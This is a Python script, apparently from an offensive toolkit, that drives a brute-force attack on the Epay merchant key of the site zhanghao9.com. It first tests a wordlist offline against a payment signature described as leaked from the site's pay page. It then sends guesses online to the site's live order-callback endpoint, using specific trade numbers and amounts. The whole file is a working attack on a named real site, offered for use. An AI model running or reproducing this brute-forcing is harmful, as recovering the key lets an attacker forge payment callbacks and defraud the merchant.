#!/usr/bin/env python3
"""zhanghao9 Epay KEY 离线+在线爆破后台。"""
from __future__ import annotations

import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
OUT_DIR = Path("/data/tools/faka/out/zh9")
if not OUT_DIR.parent.exists():
    OUT_DIR = ROOT / "out" / "zh9"
OUT_DIR.mkdir(parents=True, exist_ok=True)
LOG = OUT_DIR / "epay_brute_bg.log"
HITS = OUT_DIR / "epay_hits.jsonl"
WORDLIST = ROOT / "data" / "epay_keys_top.txt"
BRUTE = ROOT / "epay_key_brute.py"

# pay_page.html 泄露样本
OFFLINE_SIGN = "b74c178b68015a8919ba88954aa240dd"
TRADE = "441260704033551874"
MONEY = "120.96"


def log(msg: str) -> None:
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    print(line, flush=True)
    with LOG.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def main() -> int:
    log("START epay offline brute")
    cmd_off = [
        sys.executable,
        str(BRUTE),
        "--wordlist",
        str(WORDLIST),
        "--pid",
        "196",
        "--type",
        "wxpay",
        "--money",
        MONEY,
        "--out-trade-no",
        TRADE,
        "--notify-url",
        "https://zhanghao9.com/user/api/order/callback.Epay",
        "--return-url",
        f"https://zhanghao9.com/user/index/query?tradeNo={TRADE}",
        "--name",
        TRADE,
        "--sitename",
        TRADE,
        "--target-sign",
        OFFLINE_SIGN,
        "--out",
        str(HITS),
        "--workers",
        "4",
    ]
    subprocess.run(cmd_off, cwd=str(ROOT))

    log("START epay online brute (test order 903...)")
    cmd_on = [
        sys.executable,
        str(BRUTE),
        "--online",
        "--callback",
        "https://zhanghao9.com/user/api/order/callback.Epay",
        "--wordlist",
        str(WORDLIST),
        "--pid",
        "196",
        "--type",
        "wxpay",
        "--money",
        "5.46",
        "--out-trade-no",
        "903260704032647527",
        "--notify-url",
        "https://zhanghao9.com/user/api/order/callback.Epay",
        "--return-url",
        "https://zhanghao9.com/user/index/query?tradeNo=903260704032647527",
        "--out",
        str(HITS),
        "--workers",
        "4",
    ]
    subprocess.run(cmd_on, cwd=str(ROOT))
    log("DONE epay_brute_bg")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
